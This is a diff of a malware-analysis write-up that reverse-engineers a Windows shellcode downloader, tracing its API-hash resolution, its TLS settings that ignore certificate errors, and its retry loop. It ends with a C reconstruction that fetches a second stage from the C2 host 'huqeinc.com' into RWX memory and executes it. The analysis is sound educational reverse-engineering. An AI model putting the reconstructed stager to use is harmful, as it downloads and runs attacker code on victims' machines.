@@ -146,10 +146,10 @@ The PEB is a block in usermode that contains useful data from the process to use
 We see several addresses being referenced - in IDA you could load the PEB structure, but just for the sake of completeness:
 - Offset 0xc is the `LDR` member of the `PEB`, which has a type of `PPEB_LDR_DATA`, which is documented [here](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data).
 - Offset 0x14 in the `PEB_LDR_DATA` structure is the `InMemoryOrderModuleList` member, of type `LIST_ENTRY`. The `LIST_ENTRY` structure is used extensively in Windows, an is usually just a header in a larger structure. This case is no exception - the real type of the entries is `LDR_DATA_TABLE_ENTRY`.
-- At offset 0x24 in the `LDR_DATA_TABLE_ENTRY` there exists a member BaseDllName of type `UNICODE_STRING`. That type is used extensively in Windows, and is essentially a container for a Pascal-string - first two WORDs describe the length of the string and its buffer capacity. Therefore, at 0x28 we will bind the actual buffer - which will be saved in the `esi` register.
+- At offset 0x24 in the `LDR_DATA_TABLE_ENTRY` there exists a member `FullDllName` of type `UNICODE_STRING`. That type is used extensively in Windows, and is essentially a container for a Pascal-string - first two WORDs describe the length of the string and its buffer capacity. Therefore, at 0x28 we will bind the actual buffer - which will be saved in the `esi` register.
 - The `ecx` register is just 2 bytes before the DLL name buffer - and contains the length of the string.
 
-To summarize, this entire chunk fetches the `BaseDllName` in the current PEB module entry - saving the buffer in `esi` and its length in `ecx`.
+To summarize, this entire chunk fetches the `FullDllName` in the current PEB module entry - saving the buffer in `esi` and its length in `ecx`.
 
 ## Module name hash calculation
 Let us examine the next couple of instructions:
@@ -202,7 +202,7 @@ Let us move on to the next couple of instructions:
 0x0000000000000048:  01 D3                      add        ebx, edx
 ```
 First, `edx` (which contains the current module entry) and `edi` (which contains its name's hash) are backed up to the stack.
-After that, `edx` is referenced at offset 0x10. Since the list entries are of type `LDR_DATA_TABLE_ENTRY` and that they are pointed after the `LIST_ENTRY` header, 0x10 is the `DllBase` member of the entry (0x18 - 8).
+After that, `edx` is referenced at offset `0x10`. Since we are 8 bytes into the structure (of type `LDR_DATA_TABLE_ENTRY`), 0x10 is the `DllBase` member of the entry (`0x18 - 0x8`).
 Even in memory, the module has a [PE data structure](https://en.wikipedia.org/wiki/Portable_Executable), and offst 0x3c corresponds to the pointer of the PE header in the DOS header.
 We can see `eax` treated as an RVA since it's adding `edx` to itself - `edx` is the module base address in memory.
 Similarly, the offset 0x78 from that is the PE export table, which contains information about the exported symbols (commonly functions).
@@ -450,35 +450,213 @@ The next couple of instructions ends with yet another API call:
 ```
 
 After backing up the results from `HttpOpenRequestA` with `esi`, we add `ebx` with 0x50.
-Since `ebx` is guaranteed to persist between calls, it'll now point to offset `0x1b8` in the shellcode, which, when presented as string, looks like this: `'User-Agent: Microsoft-CryptoAPI/6.1\r\n`.
+Since `ebx` is guaranteed to persist between calls, it'll now point to offset `0x1b8` in the shellcode, which, when presented as string, looks like this: `User-Agent: Microsoft-CryptoAPI/6.1\r\n`.
 The hash `0x869e4675` resolves the API `wininet.dll!InternetSetOptionA`, which will get the following arguments:
 - The request handle that was saved in `esi`.
 - The value `0x1f` as `dwOption`, which is `INTERNET_OPTION_SECURITY_FLAGS` according to [this](https://learn.microsoft.com/en-us/windows/win32/wininet/option-flags).
 - The `lpBuffer` parameter will be a pointer to the value `0x3380`, which encodes security flags for the request: `WINHTTP_FLAG_SECURE_PROTOCOL_TLS1 | SECURITY_FLAG_IGNORE_UNKNOWN_CA | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_1 | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID`.
 - The `dwBufferLength` is 4, as only a DWORD was set as the `lpBuffer`.
 
-This will make the connection is TLS but ignore all TLS certificate errors.
+This will make the connection use TLS but ignore all certificate errors etc.
 
+Here are the next parts:
 
+```assembly
+0x0000000000000106:  5F                         pop        edi
+0x0000000000000107:  31 FF                      xor        edi, edi
+0x0000000000000109:  57                         push       edi
+0x000000000000010a:  57                         push       edi
+0x000000000000010b:  6A FF                      push       -1
+0x000000000000010d:  53                         push       ebx
+0x000000000000010e:  56                         push       esi
+0x000000000000010f:  68 2D 06 18 7B             push       0x7b18062d
+0x0000000000000114:  FF D5                      call       ebp
+0x0000000000000116:  85 C0                      test       eax, eax
+0x0000000000000118:  0F 84 CA 01 00 00          je         0x2e8
+0x000000000000011e:  31 FF                      xor        edi, edi
+0x0000000000000120:  85 F6                      test       esi, esi
+0x0000000000000122:  74 04                      je         0x128
+0x0000000000000124:  89 F9                      mov        ecx, edi
+0x0000000000000126:  EB 09                      jmp        0x131
+0x0000000000000128:  68 AA C5 E2 5D             push       0x5de2c5aa
+0x000000000000012d:  FF D5                      call       ebp
+0x000000000000012f:  89 C1                      mov        ecx, eax
+0x0000000000000131:  68 45 21 5E 31             push       0x315e2145
+0x0000000000000136:  FF D5                      call       ebp
+0x0000000000000138:  31 FF                      xor        edi, edi
+0x000000000000013a:  57                         push       edi
+0x000000000000013b:  6A 07                      push       7
+0x000000000000013d:  51                         push       ecx
+0x000000000000013e:  56                         push       esi
+0x000000000000013f:  50                         push       eax
+0x0000000000000140:  68 B7 57 E0 0B             push       0xbe057b7
+0x0000000000000145:  FF D5                      call       ebp
+0x0000000000000147:  BF 00 2F 00 00             mov        edi, 0x2f00
+0x000000000000014c:  39 C7                      cmp        edi, eax
+0x000000000000014e:  75 07                      jne        0x157
+0x0000000000000150:  58                         pop        eax
+0x0000000000000151:  50                         push       eax
+0x0000000000000152:  E9 7B FF FF FF             jmp        0xd2
+0x0000000000000157:  31 FF                      xor        edi, edi
+0x0000000000000159:  E9 91 01 00 00             jmp        0x2ef
+```
 
+There is a dummy `pop` to clean up over-pushing from before (we pushed the security options to the stack).
+Since we see another hash (`0x7b18062d`), we immidiately resolve its API: `wininet.dll!HttpSendRequestA`.
+There are some noteworthy parts here:
+- The user agent saved earlier in `ebx` is used as the second argument to the function.
+- After the function is called, there is a check to see if succeeded - if it failed - we jump to offset `0x2e8`.
+- Checking if `esi` is zero really checks if the request handle is not NULL. This is quite odd since we already invoked `HttpSendRequestA` at this point, but still - if it was, we jump to `0x128`.
+- At offset `0x128` we use the hash `0x5de2c5aa`, which is `kernel32.dll!GetLastError`, and save its result in `ecx`.
+- At offset `0x131` we use the hash `0x315e2145`, which is `user32.dll!GetDesktopWindow`, and then use that result with the hash `0xbe057b7`, which is `wininet.dll!InternetErrorDlg`.
+- The constant `0x2f00` is `ERROR_INTERNET_FORCE_RETRY`, and we compare the result of `InternetErrorDlg` to it.
+
+The idea is to simply call `InternetErrorDlg` and see if a retry is required.
+Let's also recall: if `HttpSendRequestA` fail - we jump to `0x2e8`. If it succeeded and a retry is not required - we jump to `0x2ef`.
+Examining offset `0x2e8` (the failure path):
+
+```assembly
+0x00000000000002e8:  68 F0 B5 A2 56             push       0x56a2b5f0
+0x00000000000002ed:  FF D5                      call       ebp
+```
+
+The hash translates to `kernel32.dll!ExitProcess`, so upon failure - we exit the process.
+This entire part might be translated as such:
+```c
+if (!HttpSendRequestA(hRequest, "User-Agent: Microsoft-CryptoAPI/6.1\r\n", -1, NULL, 0))
+{
+	ExitProcess(0);
+}
+if (ERROR_INTERNET_FORCE_RETRY == InternetErrorDlg(GetDesktopWindow(), hRequest, NULL == hRequest ? GetLastError() : 0, FLAGS_ERROR_UI_FILTER_FOR_ERRORS | FLAGS_ERROR_UI_FLAGS_CHANGE_OPTIONS | FLAGS_ERROR_UI_FLAGS_GENERATE_DATA, NULL))
+{
+	goto lblRetryConn;
+}
+...
+```
+
+## Running yet another shellcode
+Let us examine what happens at offset `0x2ef`:
+
+```assembly
+0x00000000000002ef:  6A 40                      push       0x40
+0x00000000000002f1:  68 00 10 00 00             push       0x1000
+0x00000000000002f6:  68 00 00 40 00             push       0x400000
+0x00000000000002fb:  57                         push       edi
+0x00000000000002fc:  68 58 A4 53 E5             push       0xe553a458
+0x0000000000000301:  FF D5                      call       ebp
+0x0000000000000303:  93                         xchg       ebx, eax
+0x0000000000000304:  B9 00 00 00 00             mov        ecx,0x0
+0x0000000000000309:  01 D9                      add        ecx,ebx
+0x000000000000030b:  51                         push       ecx
+0x000000000000030c:  53                         push       ebx
+0x000000000000030d:  89 E7                      mov        edi, esp
+0x000000000000030f:  57                         push       edi
+0x0000000000000310:  68 00 20 00 00             push       0x2000
+0x0000000000000315:  53                         push       ebx
+0x0000000000000316:  56                         push       esi
+0x0000000000000317:  68 12 96 89 E2             push       0xe2899612
+0x000000000000031c:  FF D5                      call       ebp
+0x000000000000031e:  85 C0                      test       eax, eax
+0x0000000000000320:  74 C6                      je         0x2e8
+```
+
+Can you guess what the hash `0xe553a458` is just based on those other constants?
+- `0x40` is `PAGE_EXECUTEREADWRITE` as we've seen earlier.
+- `0x1000` is `MEM_COMMIT`.
+Indeed, that hash corresponds to `kernel32.dll!VirtualAlloc`, and we simply allocate a RWX chunk of size `0x400000`.
+It is important to guess the attacker logic here - since we have an internet connection to some C2 server, and now we allocate a RWX page - we expect to get another payload!
+
+After that call, the resulting memory buffer is saved in `ebx` and `ecx`.
+At offset `0x30b` we begin another set of stack pushes for a function call - this time with the hash `0xe2899612` (`wininet.dll!InternetReadFile`).
+The pushes dictate the parameters (in reverse order):
+- `hFile` is `esi`, which was our internet request (of type `HINTERNET`).
+- `lpBuffer` is `ebx` - our newly allocated buffer.
+- `dwNumberOfBytesToRead` is set to be `0x2000`.
+- `lpdwNumberOfBytesRead` is `edi`, which points to spare room we allocated on the stack.
+
+Lastly, if this function fails we jump to `0x2e8`, which will again call `ExitProcess`.
+Note the there is an extra `push` instruction of `ecx` (offset `0x30b`) - this means we backed up the address of our allocated buffer.
+
+We're almost at the end! Let's examine the last couple of instructions:
+
+```assembly
+0x0000000000000322:    8B 07                      mov        eax, dword ptr [edi]
+0x0000000000000324:    01 C3                      add        ebx, eax
+0x0000000000000326:    85 C0                      test       eax, eax
+0x0000000000000328:    75 E5                      jne        0x30f
+0x000000000000032a:    58                         pop        eax
+0x000000000000032b:    C3                         ret
+```
+
+Well, `edi` pointed to the number of read bytes - it's dereferenced into `eax`.
+Then, we add that value to `ebx`, which is preserved and points to our RWX memory region.
+If `eax` is not zero then it means some bytes were read, so we jump again to `0x30f` to read some more data.
+This is common in reading scenarios - we read a maximum of 0x2000 bytes every time until we read 0, which means no bytes are left to be read.
+If we do not jump then we're at `0x32a`, where we `pop` the allocated bytes from the stack and call `ret`.
+As a reminder, we pushed the beginning of the returned buffer before, so `ret` will use it as a return address.
+This means we simply jump to the buffer we got - essentially treating it as another shellcode!
+
+## Putting it all together
+
+This is what our shellcode might conceptually look like:
 
 ```c
 HINTERNET hInternet;
 HINTERNET hConnect;
 HINTERNET hRequest;
 DWORD dwSecurityOptions = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1 | SECURITY_FLAG_IGNORE_UNKNOWN_CA | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_1 | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+DWORD dwErrorFlags = FLAGS_ERROR_UI_FILTER_FOR_ERRORS | FLAGS_ERROR_UI_FLAGS_CHANGE_OPTIONS | FLAGS_ERROR_UI_FLAGS_GENERATE_DATA;
+PBYTE pcPayload;
+PBYTE pcCurrPtr;
+DWORD dwBytesRead;
+INT (*pfnPayload)();
 
+// Make sure "wininet.dll" is loaded in current process
 LoadLibraryA("wininet");
+
+// Connect to C2
 hInternet = InternetOpenA(NULL, 0, NULL, NULL, 0);
 hConnect = InternetConnectA(hInternet, "huqeinc.com", 443, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
-hRequest = HttpOpenRequestA(hConnect, NULL, "/QpYB", NULL, NULL, NULL, INTERNET_FLAG_NO_UI | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_SECURE | INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_RELOAD, NULL);
-InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwSecurityOptions, sizeof(dwSecurityOptions));
+
+// Attempt to create a request to C2
+do
+{
+	hRequest = HttpOpenRequestA(hConnect, NULL, "/QpYB", NULL, NULL, NULL, INTERNET_FLAG_NO_UI | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_SECURE | INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_RELOAD, NULL);
+	InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwSecurityOptions, sizeof(dwSecurityOptions));
+	if (!HttpSendRequestA(hRequest, "User-Agent: Microsoft-CryptoAPI/6.1\r\n", -1, NULL, 0))
+	{
+		ExitProcess(0);
+	}
+}
+while (ERROR_INTERNET_FORCE_RETRY == InternetErrorDlg(GetDesktopWindow(), hRequest, NULL == hRequest ? GetLastError() : 0, dwErrorFlags, NULL));
+
+// Allocate RWX payload
+pcPayload = VirtualAlloc(NULL, 0x400000, MEM_COMMIT, PAGE_EXECUTEREADWRITE);
+
+// Read payload from the C2
+pcCurrPtr = pcPayload;
+do
+{
+	if (!InternetReadFile(hRequest, pcCurrPtr, 0x2000, &dwBytesRead))
+	{
+		ExitProcess(0);
+	}
+	pcCurrPtr += dwBytesRead;
+} while (0 < dwBytesRead);
+
+// Execute payload
+pfnPayload = (INT(*)())pcPayload;
+pfnPayload();
 ```
 
+## Summary
+While this is a very common shellcode to look at, statically analyzing it has learning benefits:
+- We extracted multiple layers of PowerShell code to get a 32-bit shellcode.
+- During the shellcode analysis we discussed the `PEB` and shellcoding strategy on Windows.
+- We built at tool for reverse-hash lookup (see `get_hash.py` in this repository).
+- We discussed common shellcode techniques such as `push-ret` and `call-pop`.
+- We touched some parts of the `PE` file structure.
 
+Thanks,
 
-
-
-
-
-
+Jonathan Bar Or
